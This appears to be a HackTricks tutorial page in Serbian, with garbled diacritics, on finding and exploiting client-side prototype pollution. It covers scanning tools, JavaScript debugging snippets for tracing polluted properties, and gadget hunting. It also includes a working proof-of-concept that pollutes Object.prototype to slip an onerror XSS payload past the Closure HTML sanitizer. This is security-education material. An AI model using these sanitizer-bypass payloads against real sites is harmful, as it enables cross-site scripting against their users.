# Klijentska strana Prototip Pollution

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Otkrivanje koriÅ¡Ä‡enjem automatskih alata

Alati [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **i** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) mogu se koristiti za **pronalaÅ¾enje ranjivosti prototip pollution-a**.

Pored toga, moÅ¾ete koristiti i **browser ekstenziju** [**PPScan**](https://github.com/msrkp/PPScan) da **automatski skenirate** **stranice** koje **pristupate** u potrazi za ranjivostima prototip pollution-a.

### Debugovanje gde se svojstvo koristi <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
### PronalaÅ¾enje osnovnog uzroka Problema sa Prototipom <a href="#id-5530" id="id-5530"></a>

Kada je ranjivost prototipnog zagaÄ‘enja identifikovana od strane bilo kog alata, i ako kod nije previÅ¡e sloÅ¾en, moÅ¾ete pronaÄ‡i ranjivost pretraÅ¾ivanjem kljuÄnih reÄi poput `location.hash`, `decodeURIComponent`, ili `location.search` u Chrome Developer alatima. Ovaj pristup vam omoguÄ‡ava da precizno odredite ranjivi deo JavaScript koda.

Za veÄ‡e i sloÅ¾enije kodne baze, jednostavan metod otkrivanja ranjivog koda ukljuÄuje sledeÄ‡e korake:

1. Koristite alat za identifikaciju ranjivosti i dobijte payload dizajniran da postavi svojstvo u konstruktoru. Primer koji pruÅ¾a ppmap moÅ¾e izgledati ovako: `constructor[prototype][ppmap]=reserved`.
2. Postavite prekidnu taÄku na prvu liniju JavaScript koda koja Ä‡e se izvrÅ¡iti na stranici. OsveÅ¾ite stranicu sa payload-om, zaustavljajuÄ‡i izvrÅ¡avanje na ovoj prekidnoj taÄki.
3. Dok je izvrÅ¡avanje JavaScript-a pauzirano, izvrÅ¡ite sledeÄ‡i skript u JS konzoli. Ova skripta Ä‡e signalizirati kada je svojstvo 'ppmap' kreirano, pomaÅ¾uÄ‡i u lociranju njegovog porekla:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. Vratite se na karticu **Izvori** i izaberite "Nastavi izvrÅ¡avanje skripte". JavaScript Ä‡e nastaviti izvrÅ¡avanje, a svojstvo 'ppmap' Ä‡e biti zagaÄ‘eno kao Å¡to se oÄekivalo. KoriÅ¡Ä‡enje priloÅ¾enog iseÄka olakÅ¡ava identifikaciju taÄne lokacije gde je svojstvo 'ppmap' zagaÄ‘eno. ProuÄavanjem **Steka poziva**, mogu se primetiti razliÄiti stekovi gde se zagaÄ‘enje dogodilo.

Prilikom odluÄivanja koji stek istraÅ¾iti, Äesto je korisno ciljati stekove povezane sa JavaScript bibliotekama, jer se zagaÄ‘enje prototipa Äesto deÅ¡ava unutar ovih biblioteka. Identifikujte relevantan stek prouÄavanjem njegovog povezivanja sa biblioteÄkim datotekama (vidljivo sa desne strane, sliÄno kao na slici data za voÄ‘enje). U scenarijima sa viÅ¡e stekova, poput onih na linijama 4 i 6, logiÄan izbor je stek na liniji 4, jer predstavlja poÄetno pojavljivanje zagaÄ‘enja i time koreni uzrok ranjivosti. Klikom na stek biÄ‡ete usmereni ka ranjivom kodu.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## PronalaÅ¾enje skriptnih gedÅ¾eta

GedÅ¾et je **kod koji Ä‡e biti zloupotrebljen kada se otkrije ranjivost PP**.

Ako je aplikacija jednostavna, moÅ¾emo **traÅ¾iti** **kljuÄne reÄi** poput **`srcdoc/innerHTML/iframe/createElement`** i pregledati izvorni kod da bismo proverili da li to **vodi do izvrÅ¡avanja JavaScript-a**. Ponekad, pomenute tehnike moÅ¾da neÄ‡e pronaÄ‡i gedÅ¾ete uopÅ¡te. U tom sluÄaju, Äisto pregledanje izvornog koda otkriva neke lepe gedÅ¾ete poput primera ispod.

### Primer pronalaÅ¾enja PP gedÅ¾eta u kodu biblioteke Mithil

Proverite ovaj tekst: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Rekompilacija payload-a za ranjive biblioteke

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bajpasovanje HTML sanitizera putem PP

[**Ovo istraÅ¾ivanje**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) pokazuje PP gedÅ¾ete koje treba koristiti za **bajpasovanje sanitizacije** koju pruÅ¾aju neke biblioteke HTML sanitizera:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1137).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1138).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Reference

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
